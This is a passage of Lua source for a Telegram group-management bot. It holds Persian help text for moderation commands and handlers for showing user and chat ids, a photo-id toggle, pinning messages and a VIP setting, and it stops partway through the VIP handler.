\218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\nEMJ clear cache\240\159\145\136 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \218\169\216\180 \217\135\216\167\219\140 Telegram-Cli\nEMJ \216\172\217\136\219\140\217\134\240\159\145\136 \216\177\216\168\216\167\216\170 \216\180\217\133\216\167 \216\177\216\167 \216\168\217\135 \218\175\216\177\217\136\217\135 \216\167\216\182\216\167\217\129\217\135 \217\133\219\140\218\169\217\134\216\175\nEMJ \216\180\216\167\216\177\218\152\240\159\145\136 [\216\185\216\175\216\175] \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135\nEMJ \216\167\219\140\217\133\217\190\217\136\216\177\216\170\240\159\145\136 [\217\132\219\140\217\134\218\169] \216\177\216\168\216\167\216\170 \216\172\217\136\219\140\217\134 \217\133\219\140\216\175\217\135 \216\168\217\135 \217\132\219\140\217\134\218\169\nEMJ \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174\240\159\145\136 {\216\179\217\136\216\167\217\132} \217\190\216\167\216\179\216\174\nEMJ \216\173\216\176\217\129 \217\190\216\167\216\179\216\174\240\159\145\136 {\216\179\217\136\216\167\217\132} \217\190\216\167\216\179\216\174\nEMJ \217\135\217\133\217\135 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140\240\159\145\136 {\216\179\217\136\216\167\217\132}\nEMJ \216\175\216\179\216\170\216\177\216\179\219\140 \217\190\216\167\216\179\216\174\240\159\145\136 {\216\179\217\136\216\167\217\132} \217\133\217\130\216\167\217\133",
    HelpForOwner = "\226\152\145\239\184\143 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\177\216\167\219\140 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135:\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168\240\159\145\136 \216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135\nEMJ \216\162\216\178\216\167\216\175 \216\179\216\167\216\178\219\140\240\159\145\136 [\216\162\219\140\216\175\219\140]\nEMJ \216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132\240\159\145\136 [\216\162\219\140\216\175\219\140]\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140\240\159\145\136 [\216\185\216\175\216\175]\nEMJ \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\240\159\145\136 [\216\167\216\179\217\133]\nEMJ \216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\240\159\145\136 [\216\167\216\179\217\133]\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177\240\159\145\136 [`\216\185\216\175\216\175`]\nEMJ \216\175\216\185\217\136\216\170 \216\167\216\185\216\182\216\167 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135\240\159\145\136\216\175\216\185\217\136\216\170 \218\169\216\177\216\175\217\134 \216\167\216\185\216\182\216\167\219\140\219\140 \218\169\217\135 \216\175\216\177 \217\132\219\140\216\179\216\170 \216\168\217\132\216\167\218\169\219\140 \217\135\216\179\216\170\217\134\216\175\nEMJ \216\173\216\176\217\129 \216\181\216\167\216\173\216\168\240\159\145\136 \216\173\216\176\217\129 \216\181\216\167\216\173\216\168 \216\167\216\178 \218\175\216\177\217\136\217\135\nEMJ \216\167\216\177\216\170\217\130\216\167\240\159\145\136 \216\167\216\177\216\170\217\130\216\167 \216\180\216\174\216\181 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\178\219\140\217\132\240\159\145\136 \216\170\217\134\216\178\219\140\217\132 \217\133\217\130\216\167\217\133 \216\180\216\174\216\181 \216\167\216\178 \216\167\216\175\217\133\219\140\217\134\219\140 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134\240\159\145\136 \218\175\216\177\217\129\216\170\217\134 \217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169\240\159\145\136 \216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\177\216\168\216\167\216\170\nEMJ \217\190\216\167\218\169\216\179\216\167\216\178\219\140\240\159\145\136 \217\133\216\175\219\140\216\177\216\167\217\134/\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177/\217\130\217\136\216\167\217\134\219\140\217\134/\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140/\217\133\216\173\216\177\217\136\217\133\216\167\217\134/\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170/\217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180/\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175\219\140/\216\177\216\168\216\167\216\170 \217\135\216\167/\216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135/\216\170\216\168\218\134\219\140\nEMJ \216\175\216\179\216\170\216\177\216\179\219\140\240\159\145\136 \216\181\216\167\216\173\216\168/\217\133\216\175\219\140\216\177/\217\133\217\133\216\168\216\177\nEMJ \216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134\240\159\145\136 [\216\167\217\134\218\175\217\132\219\140\216\179\219\140/\217\129\216\167\216\177\216\179\219\140] \216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134 \218\175\216\177\217\136\217\135\nEMJ \216\185\218\169\216\179 \216\162\219\140\216\175\219\140\240\159\145\136 [\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180] \217\134\217\133\216\167\219\140\216\180 \216\185\218\169\216\179 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140\nEMJ \216\173\216\175\216\167\218\169\216\171\216\177 \218\134\216\170\240\159\145\136 [\216\185\216\175\216\175] \216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\134\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \217\130\217\129\217\132 \218\175\216\177\217\136\217\135\240\159\145\136 [H:M] [H:M] \217\130\217\129\217\132 \218\175\216\177\217\136\217\135 \216\175\216\177 \219\140\218\169 \216\178\217\133\216\167\217\134 \217\133\216\180\216\174\216\181\nEMJ \216\168\216\167\216\178\218\169\216\177\216\175\217\134 \217\130\217\129\217\132\240\159\145\136 \216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135\nEMJ \217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140\240\159\145\136 [\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180] \216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \217\135\217\136\216\180 \216\177\216\168\216\167\216\170\nEMJ \216\170\216\168\216\175\219\140\217\132 \216\168\217\135 \216\167\216\168\216\177\218\175\216\177\217\136\217\135\240\159\145\136 \216\170\216\186\219\140\219\140\216\177 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\167\216\168\216\177 \218\175\216\177\217\136\217\135\nEMJ \216\177\216\167\217\135\217\134\217\133\216\167\219\140\219\140\240\159\145\136 [\217\133\216\170\217\134] \216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \216\168\217\135 \216\181\216\167\216\173\216\168 \216\177\216\168\216\167\216\170\nEMJ \217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177\240\159\145\136 [\216\179\218\169\217\136\216\170/\217\133\216\179\216\175\217\136\216\175]\nEMJ \218\169\216\167\217\134\217\129\219\140\218\175\240\159\145\136 \216\167\216\177\216\170\217\130\216\167 \216\170\217\133\216\167\217\133\219\140 \216\167\216\175\217\133\219\140\217\134 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135\nEMJ \216\168\218\169 \216\162\217\190\240\159\145\136 \216\168\218\169 \216\162\217\190 \218\175\216\177\217\129\216\170\217\134 \216\167\216\178 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135\nEMJ \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190\240\159\145\136 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\nEMJ \216\173\216\176\217\129 \217\190\219\140\216\167\217\133\240\159\145\136 [1-1000] \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135",
    HelpForModerator = "\226\152\145\239\184\143 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\216\177\216\167\219\140 \217\133\216\175\219\140\216\177\216\167\217\134:\nEMJ \216\162\219\140\216\175\219\140\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \216\162\219\140\216\175\219\140 \219\140\218\169 \216\180\216\174\216\181\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\240\159\145\136 \216\170\216\186\219\140\219\140\216\177 \216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\nEMJ \216\179\217\134\216\172\216\167\217\130\240\159\145\136 \216\179\217\134\216\172\216\167\217\130 \218\169\216\177\216\175\217\134 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130\240\159\145\136 \218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130 \217\190\219\140\216\167\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134\240\159\145\136 \217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135\nEMJ \217\130\217\129\217\132\240\159\145\136 \217\130\217\129\217\132 \219\140\218\169 \216\162\219\140\216\170\217\133 \216\175\216\177 \218\175\216\177\217\136\217\135 \219\140\216\167 \216\168\216\167\216\178\218\169\216\177\216\175\217\134 \216\162\217\134\nEMJ \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135\240\159\145\136 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \217\190\219\140\217\136\219\140\240\159\145\136 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\175\216\177 \217\190\219\140\217\136\219\140\nEMJ \217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175\240\159\145\136 \216\179\216\167\216\174\216\170 \217\132\219\140\217\134\218\169 \216\172\216\175\219\140\216\175 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 \216\168\216\167 \216\177\216\168\216\167\216\170\nEMJ \217\130\217\136\216\167\217\134\219\140\217\134\240\159\145\136 \216\175\216\177\219\140\216\167\217\129\216\170 \217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133\216\167\216\170\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134\240\159\145\136 \216\170\217\134\216\184\219\140\217\133 \217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133\240\159\145\136 \216\170\217\134\216\184\219\140\217\133 \216\167\216\179\217\133 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\173\216\179\216\167\216\179\219\140\216\170 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\240\159\145\136 \216\170\216\186\219\140\219\140\216\177 \217\133\217\130\216\175\216\167\216\177 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\nEMJ \216\167\216\183\217\132\216\167\216\185\216\167\216\170\240\159\145\136 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \219\140\218\169 \219\140\217\136\216\178\216\177\217\134\219\140\217\133\nEMJ \217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \218\175\216\177\217\136\217\135\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140\240\159\145\136 \216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\174\217\136\216\180 \216\162\217\133\216\175\218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135\nEMJ \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140\240\159\145\136 [\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180] \216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175\218\175\217\136\219\140\219\140\nEMJ \217\133\219\140\217\136\216\170 time\240\159\145\136 [\216\185\216\175\216\175] \216\170\216\186\219\140\219\140\216\177 \216\170\216\167\219\140\217\133 \217\133\219\140\217\136\216\170 \219\140\218\169 \216\180\216\174\216\181\nEMJ \217\133\219\140\217\136\216\170\240\159\145\136 [sticker/photo/video/voice/audio/gif] [\216\162\219\140\216\175\219\140]\nEMJ \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \217\133\219\140\217\136\216\170\240\159\145\136 [sticker/photo/video/voice/audio/gif] [\216\162\219\140\216\175\219\140]\nEMJ \217\133\219\140\217\136\216\170 \217\133\217\134\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \216\178\217\133\216\167\217\134 \217\133\219\140\217\136\216\170 \216\174\217\136\216\175\216\170\216\167\217\134\nEMJ \216\175\216\179\216\170\217\136\216\177\216\167\216\170\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\133\216\170\217\134 \216\175\216\179\216\170\217\136\216\177\216\167\216\170\nEMJ \216\168\217\134\240\159\145\136 \217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\167\216\178 \218\175\216\177\217\136\217\135\nEMJ \216\162\217\134\216\168\217\134\240\159\145\136 \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \217\133\216\173\216\177\217\136\217\133\219\140\216\170 \216\180\216\174\216\181 \216\167\216\178 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\216\179\216\170 \216\168\217\134\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \216\167\217\129\216\177\216\167\216\175 \217\133\216\173\216\177\217\136\217\133 \218\175\216\177\217\136\217\135\nEMJ \216\179\218\169\217\136\216\170\240\159\145\136 \216\174\217\129\217\135 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170\240\159\145\136 \216\168\216\177\216\175\216\167\216\180\216\170\217\134 \216\179\218\169\217\136\216\170 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170\nEMJ \216\167\216\174\216\177\216\167\216\172\240\159\145\136 \216\167\216\174\216\177\216\167\216\172 \216\180\216\174\216\181 \216\167\216\178 \218\175\216\177\217\136\217\135\nEMJ \216\173\216\176\217\129 \217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167\240\159\145\136 \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\170\217\133\216\167\217\133 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177\nEMJ \217\129\219\140\217\132\216\170\216\177\240\159\145\136 \217\129\219\140\217\132\216\170\216\177 \218\169\217\132\217\133\217\135 \216\167\216\178 \218\175\216\177\217\136\217\135\nEMJ \217\133\216\172\216\167\216\178\240\159\145\136 \217\133\216\172\216\167\216\178 \218\169\216\177\216\175\217\134 \219\140\218\169 \218\169\217\132\217\133\217\135 \219\140\216\167 \216\180\216\174\216\181 \216\175\216\177 \218\175\216\177\217\136\217\135\nEMJ \217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178\nEMJ \218\175\216\178\216\167\216\177\216\180\240\159\145\136 \218\175\216\178\216\167\216\177\216\180 \219\140\218\169 \217\133\216\170\217\134 \216\167\216\178 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177\nEMJ \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\132\219\140\216\179\216\170 \218\175\216\178\216\167\216\177\216\180\216\167\216\170\nEMJ \216\168\216\177\216\177\216\179\219\140\240\159\145\136 \218\134\218\169 \218\169\216\177\216\175\217\134 \216\180\216\167\216\177\218\152 \219\140\218\169 \218\175\216\177\217\136\217\135\nEMJ \216\177\216\167\219\140 \217\133\219\140\217\136\216\170\240\159\145\136 [\216\162\219\140\216\175\219\140] \216\177\216\167\219\140 \216\175\216\167\216\175\217\134 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170 \216\180\216\175\217\134 \219\140\218\169 \216\180\216\174\216\181\nEMJ \216\173\216\176\217\129 \217\133\219\140\217\136\216\170\240\159\145\136 [\216\162\219\140\216\175\219\140] \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\177\216\167\219\140 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\177\216\167\219\140 \217\133\219\140\217\136\216\170\nEMJ \216\167\216\174\216\183\216\167\216\177\240\159\145\136 [\216\175\217\132\219\140\217\132] \216\167\216\174\216\183\216\167\216\177 \216\168\217\135 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\175\217\132\219\140\217\132\nEMJ \216\173\216\176\217\129 \216\167\216\174\216\183\216\167\216\177\240\159\145\136 [\216\162\219\140\216\175\219\140] \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\216\174\216\183\216\167\216\177 \217\135\216\167\219\140 \219\140\218\169 \218\169\216\167\216\177\216\168\216\177\nEMJ \217\134\216\177\216\174\240\159\145\136 \217\134\217\133\216\167\219\140\216\180 \217\134\216\177\216\174 \216\177\216\168\216\167\216\170\nEMJ \216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170\240\159\145\136 [\216\185\216\175\216\175] \216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135"
  }
  if redis:get("EditBot:fahelpsudo") then
    Helps.HelpForSudo = redis:get("EditBot:fahelpsudo")
  end
  if redis:get("EditBot:fahelpowner") then
    Helps.HelpForOwner = redis:get("EditBot:fahelpowner")
  end
  if redis:get("EditBot:fahelpmods") then
    Helps.HelpForModerator = redis:get("EditBot:fahelpmods")
  end
  if redis:get("EditBot:facmdsemoji") then
    Emoji = redis:get("EditBot:facmdsemoji")
    Helps.HelpForSudo = Helps.HelpForSudo:gsub("\240\159\145\136", Emoji)
    Helps.HelpForOwner = Helps.HelpForOwner:gsub("\240\159\145\136", Emoji)
    Helps.HelpForModerator = Helps.HelpForModerator:gsub("\240\159\145\136", Emoji)
  end
  EMJ = redis:get("EditBot:cmdsemoji") or "\226\149\160 "
  Helps.HelpForSudo = Helps.HelpForSudo:gsub("EMJ", EMJ)
  Helps.HelpForOwner = Helps.HelpForOwner:gsub("EMJ", EMJ)
  Helps.HelpForModerator = Helps.HelpForModerator:gsub("EMJ", EMJ)
  return Helps
end
local run = function(msg, matches)
  local cmd = redis:get("GroupCmdsAccess:" .. msg.to.id)
  local lang = redis:get("gp_lang:" .. msg.to.id)
  local data = load_data("./data/moderation.json")
  local chat = msg.chat_id_
  local user = msg.from.id
  if cmd == "owner" and not is_owner(msg) then
    VarCmd = false
    return VarCmd
  elseif cmd == "moderator" and not is_mod(msg) then
    VarCmd = false
    return VarCmd
  end
  if redis:get("mute" .. msg.from.id .. "from" .. msg.to.id .. "cmds") then
    VarCmd = false
    return VarCmd
  end
  if redis:get("EditBot:closememberaccess") and not is_mod(msg) then
    VarCmd = false
    return VarCmd
  end
  if (matches[1]:lower() == "photoid" or matches[1] == "\216\185\218\169\216\179 \216\162\219\140\216\175\219\140") and is_owner(msg) then
    if matches[2]:lower() == "enable" or matches[2]:lower() == "on" or matches[2] == "\216\177\217\136\216\180\217\134" then
      if not redis:get("photoid:" .. msg.to.id) then
        redis:set("photoid:" .. msg.to.id, true)
        if not lang then
          return "*Photo for id command* `has been enabled`"
        else
          return "*\216\185\218\169\216\179 \216\168\216\177\216\167\219\140 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140* `\217\129\216\185\216\167\217\132 \216\180\216\175`"
        end
      elseif redis:get("photoid:" .. msg.to.id) then
        if not lang then
          return "*Photo for id command* `is already enabled`"
        else
          return "*\216\185\218\169\216\179 \216\168\216\177\216\167\219\140 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140* `\216\167\216\178 \217\130\216\168\217\132 \217\129\216\185\216\167\217\132 \216\168\217\136\216\175`"
        end
      end
    elseif matches[2]:lower() == "disable" or matches[2]:lower() == "off" or matches[2] == "\216\174\216\167\217\133\217\136\216\180" then
      if not redis:get("photoid:" .. msg.to.id) then
        if not lang then
          return "*Photo for id command* `is not enabled`"
        else
          return "*\216\185\218\169\216\179 \216\168\216\177\216\167\219\140 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140* `\217\129\216\185\216\167\217\132 \217\134\219\140\216\179\216\170`"
        end
      elseif redis:get("photoid:" .. msg.to.id) then
        redis:del("photoid:" .. msg.to.id)
        if not lang then
          return "*Photo for id command* `Disabled`"
        else
          return "*\216\185\218\169\216\179 \216\168\216\177\216\167\219\140 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140* `\216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175`"
        end
      end
    end
  end
  if (matches[1]:lower() == "id" or matches[1] == "\216\162\219\140\216\175\219\140" or matches[1] == "\216\167\219\140\216\175\219\140") and msg.reply_id and not matches[2] then
    if redis:get("CheckExpire:" .. msg.to.id) then
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_id
      }, action_by_reply, {
        chat_id = msg.to.id,
        cmd = "id"
      })
    elseif is_mod(msg) then
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_id
      }, action_by_reply, {
        chat_id = msg.to.id,
        cmd = "id"
      })
    end
  end
  if msg.to.type ~= "pv" then
    if matches[1]:lower() == "id" or matches[1] == "\216\162\219\140\216\175\219\140" or matches[1] == "\216\167\219\140\216\175\219\140" then
      if not matches[2] and not msg.reply_id then
        local getpro = function(arg, data)
          if msg.from.username then
            username = "@" .. msg.from.username
          elseif not lang then
            username = "Not Found!"
          else
            username = "\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!"
          end
          GpChats = redis:get("getMessages:" .. msg.to.id) or 0
          UsChats = redis:get("getMessages:" .. msg.from.id .. ":" .. msg.to.id) or 0
          Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
          if Percent_ < 10 then
            Percent = "0" .. string.sub(Percent_, 1, 4)
          elseif Percent_ >= 10 then
            Percent = string.sub(Percent_, 1, 5)
          end
          if 10 >= tonumber(Percent) then
            if not lang then
              UsStatus = "Weak \240\159\152\180"
            else
              UsStatus = "\216\182\216\185\219\140\217\129 \240\159\152\180"
            end
          elseif tonumber(Percent) <= 20 then
            if not lang then
              UsStatus = "Normal \240\159\152\138"
            else
              UsStatus = "\217\133\216\185\217\133\217\136\217\132\219\140 \240\159\152\138"
            end
          elseif 100 >= tonumber(Percent) then
            if not lang then
              UsStatus = "Active \240\159\152\142"
            else
              UsStatus = "\217\129\216\185\216\167\217\132 \240\159\152\142"
            end
          end
          if not lang then
            idText = "[\240\159\145\165] Chat info:\n*Chat ID:* `" .. msg.to.id .. [[
`
*Number of Chat Messages:* `]] .. GpChats .. "`\n\n[\240\159\145\164] Your info:\n*Your ID:* `" .. msg.from.id .. [[
`
*Number of Your Messages:* `]] .. UsChats .. "` [%" .. Percent .. [[
]
*Status:* ]] .. UsStatus .. [[

*Your Username:* ]] .. UseMark(username)
          else
            idText = "[\240\159\145\165] \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\134\216\170:\n\216\162\219\140\216\175\219\140 \218\134\216\170: `" .. msg.to.id .. "`\n\216\170\216\185\216\175\216\167\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\134\216\170: `" .. GpChats .. "`\n\n[\240\159\145\164] \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\180\217\133\216\167:\n\216\162\219\140\216\175\219\140 \216\180\217\133\216\167: `" .. msg.from.id .. "`\n\216\170\216\185\216\175\216\167\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \216\180\217\133\216\167: `" .. UsChats .. "` [" .. Percent .. "%]\n\217\136\216\182\216\185\219\140\216\170: " .. UsStatus .. "\n\219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\180\217\133\216\167: " .. UseMark(username)
          end
          if redis:get("photoid:" .. msg.to.id) then
            if data.photos_[0] then
              if not lang then
                tdcli.sendPhoto(msg.to.id, msg.id_, 0, 1, nil, data.photos_[0].sizes_[1].photo_.persistent_id_, "\240\159\145\165 Chat ID: " .. msg.to.id .. "\n\240\159\145\164 Your ID: " .. msg.from.id, dl_cb, nil)
              else
                tdcli.sendPhoto(msg.to.id, msg.id_, 0, 1, nil, data.photos_[0].sizes_[1].photo_.persistent_id_, "\240\159\145\165 \216\162\219\140\216\175\219\140 \218\134\216\170: " .. msg.to.id .. "\n\240\159\145\164 \216\162\219\140\216\175\219\140 \216\180\217\133\216\167: " .. msg.from.id, dl_cb, nil)
              end
            elseif not lang then
              tdcli.sendMessage(msg.to.id, msg.id_, 1, "`No Photo!`\n" .. idText, 1, "md")
            elseif lang then
              tdcli.sendMessage(msg.to.id, msg.id_, 1, "`\216\168\216\175\217\136\217\134 \216\185\218\169\216\179!`\n" .. idText, 1, "md")
            end
          elseif not redis:get("photoid:" .. msg.to.id) then
            tdcli.sendMessage(msg.to.id, msg.id_, 1, idText, 1, "md")
          end
        end
        tdcli_function({
          ID = "GetUserProfilePhotos",
          user_id_ = msg.from.id,
          offset_ = 0,
          limit_ = 1
        }, getpro, nil)
      end
      if matches[2] then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "id"
        })
      end
    end
    if (matches[1]:lower() == "pin" or matches[1] == "\216\179\217\134\216\172\216\167\217\130") and is_mod(msg) and msg.reply_id then
      tdcli.pinChannelMessage(msg.to.id, msg.reply_id, 1)
      if not lang then
        return "*Pinned*"
      else
        return "\216\179\217\134\216\172\216\167\217\130 \216\180\216\175"
      end
    end
    if (matches[1]:lower() == "unpin" or matches[1] == "\218\169\217\134\216\175\217\134 \216\179\217\134\216\172\216\167\217\130") and is_mod(msg) then
      tdcli.unpinChannelMessage(msg.to.id)
      if not lang then
        return "*Unpinned*"
      elseif lang then
        return "\216\179\217\134\216\172\216\167\217\130 \216\168\216\177\216\175\216\167\216\180\216\170\217\135 \216\180\216\175"
      end
    end
    if matches[1]:lower() == "vip" and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "installvip") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      elseif not matches[2] then
        Chat = msg.to.id
        if redis:hget("GroupSettings:" .. Chat, "is_vip") then
          redis:hdel("GroupSettings:" .. Chat, "is_vip")
